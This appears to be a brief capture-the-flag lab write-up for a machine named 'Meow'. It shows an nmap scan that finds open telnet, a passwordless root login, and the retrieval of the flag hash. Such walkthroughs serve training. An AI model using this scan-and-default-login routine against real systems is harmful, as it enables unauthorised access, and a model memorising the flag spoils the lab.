nmap -T4 -p- -A -Pn 10.129.195.187

23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

telnet 10.129.195.187

we get a login page asking for meow login and the password
login with just root as the username
no password needed

root@Meow:~# whoami
root

root@Meow:~# ls
flag.txt  snap

root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19

machine is rooted